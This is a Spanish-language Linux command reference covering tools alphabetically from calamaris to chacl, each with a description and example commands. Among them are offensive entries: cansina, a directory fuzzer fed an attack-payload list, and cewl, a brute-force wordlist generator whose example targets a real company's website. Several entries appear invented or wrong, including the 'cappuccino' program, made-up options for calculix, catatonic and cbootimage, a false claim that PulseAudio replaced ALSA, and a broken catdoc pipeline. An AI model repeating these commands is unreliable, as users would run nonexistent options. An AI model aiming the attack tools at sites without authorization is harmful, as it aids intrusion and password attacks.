Script de Perl que genera estadísticas a partir de archivos de registro generados por proxies HTTP, como Squid y Oops y produce informes detallados de rendimiento, estadísticas de uso y patrones de acceso.
$ calamaris -f text /var/log/squid/access.log (generar un informe en texto plano)
$ calamaris -f html /var/log/squid/access.log > squid_report.html (generar un informe en HTML)
$ calamaris -f text -d /var/log/squid/access.log (mostrará una lista detallada de los dominios más accedidos junto con el número de solicitudes)
$ calamaris -f text -a -r /var/log/squid/access.log (proporciona un desglose de las solicitudes agrupadas por rangos de direcciones IP de todo el archivo de registro)
$ calamaris -f text -m 10 /var/log/squid/access.log (restringe la salida a las 10 entradas más frecuentes en cada categoría)
1.-
Agregar un cron job para generar informes automáticamente con la linea:
$ crontar -e
     0 3 * * * /usr/bin/calamaris -f html /var/log/squid/access.log > /var/www/html/squid_report.html
Que genera un informe HTML cada día a las 3:00 a.m. y lo guarda en un directorio accesible desde un servidor web.


calc
Calculadora.
$ calc (Entra en el prompt. Su uso es el clásico: 5*2, 80/4... “Exit” para salir)
$ calc 2*7


calculix
Aplicación de análisis de elementos finitos [EA] que utiliza un formato de entrada similar al de Abaqus [.inp].
$ calculix -m input_file.inp (ejecutar un análisis estático)
$ calculix -d input_file.inp (realizar un análisis dinámico)
$ calculix -c input_file.inp (correr un análisis de contacto)
$ calculix -t inpu_file.inp (ejecutar un análisis térmico)
$ calculix -a input_file.inp (realizar un análisis acústico)
$ calculix -g input_file.inp (generar gráficos de resultados)


calcurse
Calendario y organizador de tareas por consola.
$ calcurse


calendar
Muestra hechos relevantes en inglés sobre el dia actual o el especificado con amplia variedad de calendarios. Puede personalizarse editando el archivo:
# nano /usr/share/calendar/calendar.all
Y suprimiendo las lineas de los calendarios que no se deseen y eliminando los archivos correspondientes del directorio /usr/share/calendar/
$ calendar


calife
Alternativa ligera a Sudo. Permite a los usuarios seleccionados obtener un shell con la identidad de root u otro usuario, después de ingresar su propia contraseña. Esto permite al administrador del sistema otorgar privilegios de root sin compartir la contraseña.
$ califa
En /etc/calife.auth añadir el/los usuario/s y el shell que se les autoriza:
usuario:/bin/bash


callaudiod
Demonio que se encarga de gestionar el enrutamiento de audio entre diferentes aplicaciones y dispositivos. Proporciona una interfaz D-Bus que permite a otros programas: cambiar los perfiles de audio, enviar audio al altavoz o de vuelta a su puerto original y silenciar el micrófono. Algunos de estos controles pueden ser gestionados por alsamixer. El paquete contiene el demonio y la definición de la interfaz D-Bus y su configuración en /etc/asound.conf o en ~/.asoundrc
$ ps aux | grep callaudiod (verificar el estado)
$ cat /var/log/audio.log (ver el registro de eventos de audio)
$ aplay -D plughw:1 ~/ (redirigir el audio de una aplicación)
$ cat /proc/asound/card0/pcm0p/sub0/status (verificar el estado de un dispositivo de audio)
# systemctl restart pulseaudio (reiniciar la aplicación)
$ pacmd list-sinks (verificar los dispositivos de audio disponibles)
Nota.- En sistemas modernos, callaudiod es parte del sistema PulseAudio, que ha reemplazado a otros sistemas como ALSA.


cancel
Cancelar trabajos de impresión
$ cancel -u usuario  (del usuario especificado)
$ cancel -a  (todos los trabajos)


cansina
Trata de descubrir directorios ocultos en los que poder encontrar información útil. Descarga:
$ git clone https://github.com/deibit/cansina
# python cansina.py -h (Ayuda)
# python cansina.py -u URL -p fuzzdb/attack-payloads/all-attacks/all-attacks-unix.txt (Los parámetros mínimos son la URL y el peyload a usar)
Una vez lanzado el fuzzer, crea un archivo .sqlite en el directorio data que puede convertirse en .html con:
$ python viewer.py -p data/URL.sqlite
Y visualizarse en cualquier navegador.


canto
Lector de noticias rss. Configuración en .canto/conf.py para abrir las noticias con firefox, modificar la linea: link_handler("firefox \"%u\"")
$ canto -i archivo.opml (Entrar archivo de fuentes)
Atajos:
	j / k (Bajar / subir por las fuentes)
	g (Abrir noticia en el navegador para firefox)
	. / , (Siguiente / anterior noticia sin leer)
	space	 (abrir noticia)
	q (salir)
	r (marcar fuente como leída)
	R (marcar todas las fuentes como leídas)
	u (Volver a marcar fuente como no leída)
	U (Volver a marcar todas las fuentes como no leídas)
	Ctrl + r (Actualizar fuentes)
	f (Buscar palabra en las noticias)


capistrano
Automatizar tareas a través de SSH en servidores remotos, como instalación de software, implementación de aplicaciones, administración de configuración, monitoreo de servidores ad hoc y más.
$ cap install (crear un nuevo proyecto)
$ cap custom:check_disk (ejecuta la tarea en todos los servidores configurados en Capfile o en /lib/capistrano/tasks/custom_tasks.rake)
$ cap production deploy (para configurar los servidores y rutas en config/deploy.rb)
$ cap nginx:restart (reiniciar un servicio. Tiene que estar establecido en la configuración)
$ cap commands:execute (ejecutar un comando en múltiples servidores. Tiene que estar establecido en la configuración)
$ cap production deploy --trace (modo verbose para obtener más detalles)


cappuccino
Ejecute este software en su computadora cuando no esté motivado para trabajar y disfrute haciendo algo diferente. Este comando es un programa de distracción diseñado para ayudar a las personas a tomar pausas y reducir el tiempo de concentración durante el trabajo.
$ cappuccino --auto-start --threshold 50 --activity-type games (ejecutar automáticamente cuando la productividad disminuya)
$ cappuccino --duration 30m --activity-type videos (ejecutar durante un tiempo específico)
$ cappuccino --auto-start --threshold 60 --activity-type games,puzzles,music (configurar múltiples actividades)
1.-
Un ejemplo de archivo de configuración básico podría ser:
# nano ~/.config/cappuccino/config.yml
auto_start: true
threshold: 50
duration: 15m
activities:
 - games
 - puzzles
 - music


capsh
Permita probar y explorar el uso de capabilities. [relacionado con getcap, setcap y getpcaps]
$ capsh --print (Lista de capabilities actuales)


capstans
Herramienta para recopilar estadísticas sobre la carga actual de una interfaz de red.
$ capstans -i eth1 -I 2 (actualizar cada 2 segundos)
$ capstans -l (Imprimir resultados en syslog y no por pantalla)


capstats
Herramienta para recopilar estadísticas sobre la carga actual de una interfaz de red, ya sea mediante libpcap o la interfaz nativa de Endace. Informa estadísticas por intervalo de tiempo o por el tiempo de ejecución total de la herramienta.
$ capstats captura.pcap (con un archivo captura.pcap generado por herramientas como tcpdump, se puede analizar el tráfico)
$ capstats -m captura.pcap (mostrar estadísticas en megabytes por segundo [Mbps])
$ capstats -s 2 captura.pcap (estadísticas en intervalos de 2 segundos)
$ tcpdump -i eth0 -w - | capstats - (redirige el tráfico capturado por tcpdump directamente a capstats para analizarlo)


caracteres-especiales
Son signos con un caracter especial en bash:
	~ (Directorio home)
	` (Sustitución de comando)
	# (Comentario)
	$ (Variable)
	& (Proceso en background)
	; (Separador de comandos)
	* (Comodín para cero o cualquier número de caracteres)
	? (Comodín para un sólo carácter)
	/ (Separador de directorios)
	( (Empezar un subshell)
	) (Terminar un subshell)
	\ (Carácter de escape)
	< (Redirigir la entrada)
	> (Redirigir la salida)
	| (Tuberia)
	[ (Empieza conjunto de caracteres comodín)
	] (Acaba conjunto de caracteres comodín)
	{ (Empieza un bloque de comando)
	} (Acaba un bloque de comando)
	' (Entrecomillado fuerte)
	" (Entrecomillado débil)
	! (No lógico de código de terminación)


caracteres-unicode
Unicode es un estándar de codificación de caracteres diseñado para facilitar el tratamiento informático, transmisión y visualización de textos de múltiples lenguajes y disciplinas técnicas, además de textos clásicos de lenguas muertas.
Para insertarlos en un texto o en la consola, debe mirarse el código lanzando la aplicación charmap, seleccionar la grafía, latin en este ajemplo, clicar la letra correspondiente y en la parte inferior de la ventana nos aparecerá el código U+004D LATIN CAPITAL LETTER M [Letra M]. Vamos al texto y lo insertamos pulsando la combinación de teclas Ctrl+Shift+u y pulsando sucesivamente los números y letras 0,0,4,D. Al soltar las teclas Ctrl,Shift,u, pulsar espacio o intro aparecerá la letra M. También  puede consultarse la tabla <http://www.unicode.org/charts/> para encontrar el código que queremos representar.


cardctl
Utilidad para ordenadores portátiles de control de tarjetas PCMCIA [Tarjetas de memoria que permiten añadir al ordenador nuevas funciones, tales como tarjetas de sonido, de red...]
# cardctl status (Muestra el estado)
# cardctl config (Muestra la configuración)
# cardctl ident (Muestra información)
# cardctl suspend (Interrumpe la alimentación de la tarjeta)
# cardctl eject (La desactiva)
# cardctl insert (La activa nuevamente)


care
Supervisa la ejecución del comando especificado para crear un archivo que contiene todo el material necesario para volver a ejecutarlo en el mismo contexto. De esa manera, el comando será reproducible en todas partes, incluso en sistemas Linux que se supone que no son compatibles con el sistema Linux original.
$ care -o contexto-ls.tar ls /etc (crea un archivo contexto-ls.tar que contiene todo lo necesario para ejecutar el comando ls /etc en otro sistema)
$ care -v -o contexto-apache.tar apachectl start (modo detallado de captura del contexto necesario para iniciar Apache, lo que incluye los archivos de configuración utilizados y cualquier otro recurso accedido durante la ejecución)
1.-
Supongamos que se tiene un script llamado mi_script.sh que depende de variables de entorno y archivos específicos:
$ care -o contexto-script.tar ./mi_script.sh
El archivo contexto-script.tar contendrá lass variables de entorno usadas durante la ejecución y los archivos abiertos o modificados por el script.


cargo
Gestor de paquetes del lenguaje Rust. Crea el directorio ~/.cargo.
$ cargo install paquete (instalar un paquete)
$ cargo --list (listado de todos los comandos)
$ cargo help clean (información sobre un comando)


case
El conjunto de palabras case ... esac conforman un selector en función de un resultado.
Algunos ejemplos:
1.-
	#!/bin/bash
	read -p "Pon un número del 1 al 3 " NUM
	case $NUM in
		1)
		  echo "uno"
		;;
		2)
		  echo "dos"
		;;
		3)
		  echo "tres"
		;;
		*)
		  echo "No es del 1 al 3"
		;;
	esac
2.-
Combinado con un while para crear un menú:
	#!/bin/bash
	while [ "$OPCION" != 3 ]
	do
	echo
	echo "[1] ¿Saber el host? "
	echo "[2] ¿Directorio dondo estás? "
	echo "[3] Salir "
	echo
	read -p "Escoger una opción " OPCION
	echo
	case $OPCION in
		1)
		    echo $HOSTNAME
		;;
		2)
		    pwd
		;;
		3)
		    echo "Abortando..."
		;;
		*)
		    echo "La opción no es válida"
		exit
		;;
	esac
	done


cat
Muestra el archivo especificado
$ cat -n .bashrc (Numera las lineas de salida)
$ cat -b .bashrc (Sólo numera las lineas no vacias)
$ cat -s .bashrc (Suprime varias lineas vacias por una sola)
$ cat -A archivo (Ver los caracteres no imprimibles)
$ cat file{0..4} > archivo (Junta file1, file2, file3 y file4 en un sólo archivo)
$ cat file1 file2 file3 file4 archivo (Lo mismo)
Algunos archivos importantes usando cat:
$ cat /proc/cpuinfo       (informacion del procesador)
$ cat /var/log/debug | less	 (inf del sistema)
$ cat /var/log/user.log | less		 (inf del usuario)
$ cat /var/log/messages | less	 (mensajes del sistema)
$ cat /var/log/syslog | less 		 (registro de actividad)
$ cat /var/log/auth.log | less       (accesos al sistema)
$ cat /proc/meminfo	(inf sobre la memoria)
$ cat /proc/devices	 (inf sobre los dispositivos en uso)
$ cat /proc/mounts    (inf de las particiones y recursos montados)
$ cat /proc/filesystems	 (los filesystems habilitados en el kernel)
$ cat /etc/X11/default-display-manager (para conocer el gestor de sesiones)
$ cat /proc/version        (version del nucleo y compilador empleado)
$ cat < /sys/class/net/eth1/address (Muestra la dirección MAC)
$ cat /etc/services | grep http (Visualizar puertos por los que corre http)
$ cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | sed 1q (generar una contraseña de 10 caracteres)
$ cat listado.txt / | sed -e :a -e 's/^.\{1,20\}$/&_/;ta'  (coloca los nombres del listado uno detrás de otro y completa hasta 20 caracteres [1,10] con un guión bajo [&_])


catatonic
Proceso de inicialización para contenedores de aplicaciones. Este sistema está diseñado para simplificar la administración de contenedores de aplicaciones y mejorar la eficiencia en el arranque y su ejecución.
# catatonic list (listar todos los contenedores)
# catatonic status (mostrar el estado actual de todos los contenedores gestionados)
# catatonic start <nombre_del_contenedor> (iniciar un contenedor específico por su nombre o ID)
# catatonic stop <nombre_del_contenedor> (parar un contenedor)
# catatonic restart <nombre_del_contenedor> (reiniciar)
# catatonic remove <nombre_del_contenedor> (eliminar un contenedor)
# catatonic inspect <nombre_del_contenedor> (mostrar detalles de un contenedor específico)


catdoc
Lee archivos Microsoft Word [.doc, .dot, .rtf y .xml]. y envía su contenido a la salida estándar como texto. Incluye las herramientas xls2csv [convierte formatos de hojas de cálculo de Excel] y catppt [utilidad para extraer información textual de archivos de PowerPoint]
$ catdoc archivo.doc (uso básico)
$ catdoc archivo.doc > contenido.txt (guardar el texto en contenido.txt)
$ head -n 10 | catdoc archivo.doc (mostrar solo las primeras 10 líneas del documento como texto sin formato)


catdvi
Herramienta para visualizar en texto plano archivos DVI [Device Independent] generados por LaTeX y otros procesadores de TeX.
$ catdvi archivo.dvi > contenido.txt (crea un archivo llamado `contenido.txt` con el contenido del archivo DVI)
$ catdvi archivo.dvi (visualizar el contenido en pantalla)
$ catdvi -p 5 -l 10 archivo.dvi (mostrar páginas de la 5 a la 10 del archivo DVI. También puede especificarse "-p 5:10")
$ catdvi -s archivo.dvi (ignora caracteres especiales)


catfishq
Herramienta diseñada para trabajar con archivos de secuencias FASTQ, un formato ampliamente utilizado en bioinformática para almacenar información sobre lecturas de secuencias de ADN. La herramienta permite concatenar e imprimir archivos FASTQ, ya sea comprimidos, por ejemplo, en formato GZIP o no.
$ catfishq archivo1 archivo2 archivo3 (concatena y imprime en la salida estándar los contenidos de los archivos especificados)
$ catfishq file1.fastq file2.fastq > combined.fastq (combined.fastq contendrá las secuencias de ambos archivos concatenadas en el mismo formato)
$ catfishq file1.fastq.gz file2.fastq.gz > combined.fastq (descomprime automáticamente los archivos, los concatena y los guarda en combined.fastq)
$ catfishq large1.fastq.gz large2.fastq.gz | gzip > combined.fastq.gz (concatena los archivos directamente y los comprime nuevamente en el formato GZIP)


catgirl
Cliente de terminal IRC [Internet Relay Chat] minimalista.
$ catgirl HOST


catimg
Ver imagenes ascii
$ catimg -r 2 imagen.png (con mejor resolución que -r 1)


catkin
Este paquete es parte de ROS [Robot Operating System - sistema operativo para robots] técnicamente se trata de un conjunto de bibliotecas y herramientas que ayudan a desarrollar aplicaciones de software para robots. Para usar Catkin, se necesita configurar un "workspace" [espacio de trabajo], que es una carpeta donde se gestionarán todos sus paquetes y la estructura básica es:
$ mkdir -p ~/catkin_ws/{src,build,devel,install}
$ cd ~/catkin_ws
En el que dentro del directorio raíz del espacio de trabajo se incluyan los directorios src [para el código fuente de los paquetes], build [para los archivos de construcción generados por Catkin], devel [para los archivos de desarrollo, librerías, scripts, etc.] y install [con los archivos instalados después de construir el workspace]
$ catkin_make (en el interior del directorio raiz, genera, si no estan, los directorios build y devel)
Para crear un nuevo paquete dentro del espacio de trabajo
$ cd ~/my_catkin_ws/src
$ catkin_create_pkg mi_robot std_msgs roscpp
Esto genera una estructura básica para el paquete mi_robot que depende de std_msgs y roscpp, crea un archivo de configuración CMakeList.txt para la construcción yotro package.xml con información sobre el paquete [nombre, descripción, dependencias, etc.].
Una vez creado un paquete o añadido código, se debe construir el espacio de trabajo para generar los binarios necesarios:
$ cd ~/my_catkin_ws
$ catkin_make
Que compila todos los paquetes en src/ y genera los archivos correspondientes en las carpetas build/ y devel/.
Después de construir el espacio de trabajo, se necesita configurar el entorno para poder ejecutar los nodos y scripts:
$ source ~/my_catkin_ws/devel/setup.bash (actualiza las variables de entorno para incluir los archivos generados por Catkin)
Si el paquete mi_robot tiene un nodo llamado controlador:
$ rosrun mi_robot controlador
Si se precisa agregar nuevas dependencias a un paquete, editar el archivo package.xml y agregar las nuevas dependencias. Por ejemplo:
      <depend>geometry_msgs</depend>
      <depend>sensor_msgs</depend>
Después, reconstruir el espacio de trabajo con catkin_make.
$ catkin_make


cava
[C.A.V.A.]. Visualizador de audio de espectro de barras para la terminal Linux que utiliza ALSA, pulseaudio o búfer fifo para la entrada.
$ cava (mientras está sonando música son un clásico reproductor))


caveconverter
Software para convertir entre varios formatos de datos topográficos. Los formatos admitidos actualmente son: formatos escritos: Toporobot, Survex, Compass; formatos leídos: Survex, Pockettopo, dxf polilíneas y líneas
$ caveconverter survexfile.svx output.text s t (convertir datos Survex existentes al formato Toporobot para poder importarlos a PocketTopo)
$ caveconverter pdaexport.txt survexfile.svx p s lrud (convertir datos exportados desde PocketTopo al formato Survex, incluida la información LRUD de los gráficos)
$ caveconverter datafile.dxf survexfile.svx d s  (convertir datos del formato DXF al formato Survex)


cb-
[crunchbang-bin-scripts]. Conjunto de scripts propios de la distro crunchbang.
cb-exit (Lanza el dialogo de salida)
cb-welcome (script para reconfigurar el sistema. Arranca recien instalado el S.O)
cb-lock (protector de pantalla)


cbatticon
Muestra información sobre la batería, como su estado, porcentaje de carga y el tiempo restante, mediante un icono en la bandeja del sistema.


cbm
Muestra el trafico de red
# cbm


cbonsai
Crea bonsais en la consola.
$ cbonsai (estático)
$ cbonsai -l (lo va creando)
$ cbonsai -i (va mostrando varios bonsais)


cbootimage
Este paquete contiene dos programas para analizar la boot config table [bct - tabla de configuración de arranque] de dispositivos basados en SoC Tegra y para generar una nueva bct con un gestor de arranque adjunto. por ejemplo, u-boot, que se leerá para ser flasheado en un dispositivo de almacenamiento. La tabla de configuración de arranque se utiliza en el proceso de arranque inicial para configurar el controlador de memoria DRAM sdhci y también indica la posición del gestor de arranque.
$ cbootimage -i /ruta/a/imagen.bin -o bct.txt (analizar una imagen específica y mostrar información detallada)
$ cbootimage -i /ruta/a/imagen.bin --bct-only > bct_contents.txt (mostrar solo el contenido de la tabla BCT)
$ cbootimage -i magen1.bin imagen2.bin --compare-bct (comparar dos imágenes y mostrar las diferencias en la BCT)
$ cbootimage -i /ruta/a/imagen.bin --extract-info (extraer información específica de la BCT)
$ cbootimage --check-compatibility /ruta/a/imagen.bin (verificar si un dispositivo es compatible con cbootimage)


cbp2make
Herramienta diseñada para convertir archivos de proyectos o espacios de trabajo de Code::Blocks [un IDE para desarrollo en C y C++] en archivos Makefile compatibles con GNU Make.
$ cbp2make -in mi_proyecto.cbp (generará un archivo Makefile en el directorio actual)
$ cbp2make -in mi_proyecto.cbp -out /proyectos/mi_proyecto/ (el archivo Makefile se guardará en la ruta proporcionada)
$ make (después de generar el archivo Makefile, compila el proyecto con GNU Make)
Nota.- Si el proyecto tubiera múltiples configuraciones, por ejemplo, Debug y Release, se puede especificar al ejecutar make: make CONFIG=Release ; make CONFIG=Debug
$ cbp2make -in mi_workspace.workspace (genera un Makefile que incluye las reglas para construir todos los proyectos contenidos en el espacio de trabajo)
$ cbp2make -in mi_proyecto.cbp -v (ver más detalles sobre el proceso de conversión si el Makefile generado no funciona como se esperaba)


ccache
Es un caché de compiladores. Acelera la recompilación almacenando en caché compilaciones anteriores y detectando cuándo se vuelve a realizar la misma compilación.
$ ccache gcc -o ejecutable archivo.c (compila un archivo C usando 'gcc' y almacena la salida en el caché)
$ ccache -s (ver qué archivos están almacenados en el caché)
$ ccache -C (limpiar caché)
$ ccache -z mi_codigo.c (verificar si determinado archivo está en el cache)


ccal
Calendario colorizado
$ ccal -e (formato europeo: primer dia semana,  lunes)
$ ccal -e 3 2011 (mostrar el marzo de 2011)
$ ccal -a (formato americano: primer dia semana, domingo)
$ ccal -e 2011 (mostrar todo el 2011)


ccat
Como el comando cat pero con más colorido. Si se prefiere ccat a cat poner en ~/.bashrc la linea:
     alias cat=ccat
     $ source ~/.bashrc (recargar .bashrc)
Descarga:
     $ wget https://github.com/jingweno/ccat/releases/download/v1.1.0/linux-amd64-1.1.0.tar.gz
     $ tar xfz linux-amd64-1.1.0.tar.gz
     $ cd linux-amd64-1.1.0
     # cp linux-amd64-1.1.0/ccat /usr/local/bin/
$ ccat fichero1 fichero2 (abrir varios ficheros)
$ ccat fichero1 fichero2 --html > fichero.html (crear un html)
$ ccat --palette (colores disponibles)


ccd2iso
Convierte una imagen img/ccd/sub/cue a iso
$ ccd2iso imagen.img imagen.iso


ccdiff
busca diferencias entre dos archivos y muestra de distinto color las líneas cambiadas.
$ ccdiff --list-colors (ver todos los colores disponibles)
$ ccdiff -m -i -B file1 file2 (usando marcas en las diferencias [m], ignorando mayúsculas/minúsculas [i] y espacios en blanco [B])
Algunas opciones:
	--old=color
          Definir el color de primer plano para el texto eliminado.
        --new=color
          Definir el color de primer plano para el texto agregado.
        --bg=color
          Definir el color de fondo para el texto modificado


cclive
Herramienta de descarga de video para YouTube y otros sitios web de videos similares.
$ clive https://www.youtube.com/watch?v=VIDEO_ID (descarga básica de un video)
$ clive -S https://www.youtube.com/channel/CHANNEL_ID (consultar los flujos de medios disponibles)
$ cclive -s best https://www.youtube.com/channel/CHANNEL_ID (descargar el flujo de medios de mejor calidad)


ccrypt
Utilidad para poner contraseña a un archivos o directorios [sustituye el original].
$ ccrypt -e fichero   (poner contraseña, confirmar y convierte el fichero en fichero.cpt)
$ ccrypt -d fichero.cpt (abrirlo)
$ ccrypt -c fichero.cpt (lo visualiza en consola. Como "cat")
$ ccrypt -x fichero.cpt (cambia la contraseña. Primero pide la contraseña, luego la nueva y confirmación)
$ ccrypt -er dir   (cifrar un directorio entero recursivamente)


ccze
Colorear la salida de un comando
$ cat /var/log/apache2/access.log | ccze -A


cd
Moverse a un directorio
$ cd     (entra al directorio personal estes donde estes)
$ cd ~   (entra al direcotorio personal estes donde estes)
$ cd ..  (baja un nivel)
$ cd ../.. (baja dos niveles)
$ cd -   (entra en el último directorio en el que se ha estado)


cd-discid
Para realizar consultas a traveés de internet sobre CDDB [CD Database] que es un servicio en línea que contiene información sobre discos de audio, incluyendo títulos, artistas y pistas.
$ cd-discid /dev/cdrom/


cd-drive
[libcdio-utils]. Describe las características de la unidad de CD-ROM/DVD.
$ cd-drive


cd-paranoia
Herramienta para extraer pistas de audio de discos compactos [CDs] en formato CDDA [Compact Disc Digital Audio]. Permite leer directamente el disco óptico sin necesidad de un sistema operativo o software de lectura de CD integrado. Esto lo hace útil para recuperar datos de CDs antiguos o dañados.
$ cd-paranoia (forma básica estando en el directorio del CD [/media/cdrom])
$ cd-paranoia -vb -C 0x41 (modo detallado, saltarse errores de lectura y código de error específico)
$ cd-paranoia -B (extraer todas las pistas de un CD)
$ cd-paranoia -t 5 (extraer una pista específica)
$ cd-paranoia -V (verificación de datos)


cd5
Herramienta para verificar la integridad de un CD-ROM de múltiples pistas calculando el checksum MD5 y reportando el tamaño de cada pista. Esto permite asegurarse de que los datos en el CD-ROM no se hayan corrompido durante el proceso de grabación. La aplicación usa una ruta fija al dispositivo que actualmente es /dev/cdrom para acceder al CD-ROM, si el dispositivo está en otra ubicación, por ejemplo, /dev/sr0, se debe crear un enlace simbólico:
# ln -s /dev/sr0 /dev/cdrom
$ cd5 (verificar un CD-ROM, mostrando checksum y tamaño de cada pista en bytes)
      Track 01: MD5=abcdef1234567890abcdef1234567890  Size=12345678 bytes
      Track 02: MD5=1234567890abcdef1234567890abcdef  Size=98765432 bytes
      ...


cdargs
Herramienta que mejora la navegación por el sistema de archivos desde la shell. Se conecta al comando de CD a través de una función de shell o un alias y le agrega marcadores y un navegador que permite moverse a un lugar muy distante en el sistema de archivos con solo unas pocas pulsaciones de teclas.
$ cdargs -a path (agregar una ruta a la lista de marcadores)
$ cdargs -u user (ver los marcadores de un usuario. Para eliminar una entrada pulsar "d". Pulsar "q" para salir)
$ cdargs (si solo hay un usuario entra en su listado como en el caso anterior)
$ cv xxx (con las primeras letras y tab se entra en el directorio que se ha entrado en el listado)
$ ca (al entrar en un directorio y pulsar ca se incorpora el directorio en la lista de marcadores)
Para incorporar cdargs en .bashrc:
     cp /usr/share/doc/cdargs/examples/cdargs-bash.sh ~/.bashrc-cdargs
     echo '. ~/.bashrc-cdargs' >> ~/.bashrc


cdbackup
Utilidad específica para crear copias de seguridad de discos CD-R/W. Incluye la aplicación cdrestore [ver]
$ cdbackup /dev/cdrom backup.iso (copiar un disco CD a una imagen ISO)
$ cdbackup -v -b 2048M /dev/dvd backup_dvd.iso (copiar un disco DVD a una imagen ISO en modo verbose y tamaño máximo de cada bloque 2048)
$ cdbackup -s /dev/cdrom backup_data.iso (copiar solo los datos útiles sin estructura de directorios de un disco CD)


cdcd
Utilidad para controlar reproductores de CD de música. Permite tanto comandos directos como un modo interactivo.
$ cdcd (la primera vez que se ejecuta hace algunas preguntas con el dispositivo reproductor /dev/cdrom y entra en modo interactivo)
$ cdcd play (empezar a reproducir un CD)
$ cdcd stop (detener la reproducción)
$ cdcd next (asvanzar a la siguiente pista)
$ cdcd prev (retroceder a la pista anterior)
$ cdcd track 4 (elegir una pista específica)
$ cdcd eject (expulsar el cd)
En modo interactivo los comandos son los mismo pero con el prompt de cdcd:
        $ cdcd
        > play
        > next
        > eject
1- Configurar una alarma con cron para que cdcd empiece a reproducir un CD a una hora específica, añadir una linea en contrab parecida a:
              0 7 * * * cdcd play
Este ejemplo haría que el CD comenzara a reproducirse todos los días a las 7:00 AM.


cdclose
[cdtool]. Cerrar el cd.
$ cdclose -d /dev/sr0 (especificando el dispositivo [cdrom0...])


cdda2wav
Extraer pistas de audio de un cd
$ cdda2wav -B -H -D /dev/sdxx -s -x (extrae disco completo en archivos wav separados.)
$ cdda2wav -H -D /dev/sdxx -s -x -t 5 (extrae la pista nº 5)


cdebconf
Parte del sistema de configuración Debconf y se utiliza para interactuar con la interfaz de configuración de paquetes Debian.
# cdebconf debconf-string/hostname string "mihost" (configura el nombre del host en la instalación)
# cdebconf debconf-select/multiple select "miopcion" otraopcion" (configurar varias opciones en la configuración)
# cdebconf debconf-defaults boolean true (establece un valor booleano como verdadero por defecto)
# cdebconf debconf-show hostname (muestra el valor actual del campo de configuración "hostname")
# cdebconf debconf-set debconf-string/hostname string "nuevoNombre" (cambia el valor del campo "hostname" a "nuevoNombre")


cdeject
[cdtool]. Abrir el cd. Ver eject
$ cdeject -d /dev/sr0 (especificando el dispositivo [cdrom0....])


cdinfo
[cdtool libcdio-utils]. Muestra Información del cd si se encuentra disponible. En algunas distros cd-info
$ cdinfo -d /dev/sr0


cdir
[cdtool]. Información sobre el directorio del cd
$ cdir -n (Duración de las canciones de un cd)
$ cdir -d /dev/sr0 -r (Lo mismo especificando dispositivo)


cdparanoia
Extraer pistas de audio de un cd.
$ cdparanoia -B -d /dev/sdxx (extrae disco completo en archivos wav separados)
$ cdparanoia 5 -d /dev/sdxx (extrae el track nº 5)
$ cdparanoia  "2[:35.00]-2[2:30.00]" (extraer solo de la pista 2 del minuto 1,35 al 2,35)


cdrdao
Extraer / grabar pistas de CD en modo DAO (Disk at once)
# cdrdao read-cd -v 2 --device /dev/cdrom --read-raw --datafile imagen.bin imagen.toc (Extraer junto a su tabla de contenidos)
# cdrdao copy -v 2 --device 0,0,0 --source-device 0,1,0 --speed 4 --buffers 64 --reload --eject --on-the-fly --fast-toc (copia al vuelo de CD)
# cdrdao read-cd -v 2 --device 0,1,0 --read-raw --datafile img.bin img.toc (Extraer imagen)
# cdrdao write -v 2 --device 0,3,0 --speed 4 --buffers 64 img.toc (Grabar imagen)


cdrecord
Grabación de cds.
$ cdrecord -scanbus (Escaneo de grabadoras)
$ cdrecord -v dev=/dev/sdd imagen.iso (modo básico)
$ cdrecord -v dev=0,1,0 speed=4 -isosize /dev/scd0 (copiar directamente de un dispositivo a otro)
$ cdrecord -v -eject speed=8 dev=0,0,0 test.iso (iniciar la grabación)
$ cdrecord -v dev=/dev/cdrom blank=fast (Borrar un cd regrabable)
opciones
-v .- muestra más información de salida
-eject .- expulsa el disco al finalizar la grabación
-speed .- especifica la velocidad de grabación
-dev .- número de dispositivo [0,1,0] obtenido con cdrecord -scanbus
-dummy .- simula la grabación


cdrestore
Utilidad diseñada para facilitar la transmisión de copias de seguridad hacia discos CD-R(W).
$ cdrestore -v /dev/cdrw backup.iso (modo detallado, restaurar una iso a un CD
Nota.- la opción -d ejecuta la operación en modo dry-run [sin escribir datos]


cert-sync
Importar certificados. Ver update-ca-certificates
$ cert-sync --user /etc/ssl/certs/ca-certificates.crt


certtool
[gnutls]. Herramienta para analizar y generar certificados, solicitudes y claves privadas X.509. Se puede utilizar de forma interactiva o no interactiva.
$ certtool --generate-privkey --outfile key.pem --rsa (crear una clave RSA [otras opciones: dsa, ecc] privada i que se guarde en key.pem)
$ certtool --certificate-info --infile cert.pem (información sobre un certificado)


cewl
Generador de lista de palabras a partir de las palabras existentes en una página web y que pueden ser utilizadas por otros programas (Bruter, John the Ripper...), para realizar ataques de fuerza bruta.
$ cewl -a -d 3 -m 5 -w wordlist.txt http://www.movistar.es (Incuir metadatos [a], profundidad 2 serían todas las palabras de la web principal y todas las de las webs enlazadas desde esta [-d 2], con un mínimo de 5 caracteres [-m 5] y que lo guarde en wordlist.txt [-w]
$ cewl -w wordlist.txt -o -e URL (que escriba el resultado en wordlist.txt, que escanee enlaces externos y correos electrónicos [e])


cfiles
Gestor de archivos de terminal con teclas tipo vim, escrito en C usando la biblioteca ncurses. Su objetivo es proporcionar una interfaz como ranger, siendo al mismo tiempo ligero, rápido y mínimo. Se puede descargar de <https://github.com/mananapr/cfiles.git>


cftp
Conexión remota por ftp.
$ cftp usuario@host (Despues de solicitar contraseña, entra en el prompt)
cftp> ? (Muestra los comandos disponibles.)
Pulsando “exit” salimos del prompt


chacl
[acl]. Cambiar la lista de control [acl, Access Control Lists] de acceso de un archivo o directorio permitiendo establecer permisos detallados para usuarios y grupos específicos, más allá de los permisos tradicionales
       $ chacl -l archivo.txt
       archivo.txt [u::rw-,g::r--,o::r--]
$ chacl u::r-x,g::r-x,o::--x archivo.txt (cambia permisos de archivo.txt a propietario: lectura y ejecución, grupo: lectura y ejecución y otros solo ejecución)
$ chacl u:user:rwx archivo.txt (da al usuario "user" permisos de lectura, escritura y ejecución en el archivo archivo.txt)
$ chacl g:users:rw archivo.txt (al grupo "users" se le otorgan permisos de lectura y escritura en archivo.txt)
$ chacl -B archivo.txt (borra todas las ACL del archivo archivo.txt, dejando solo los permisos estándar de propietario, grupo y otros)
$ chacl -R u:user:r directorio/ (otorgar permiso de solo lectura al usuario "user" en el directorio "directorio/" y en todos los archivos y subdirectorios contenidos en él)
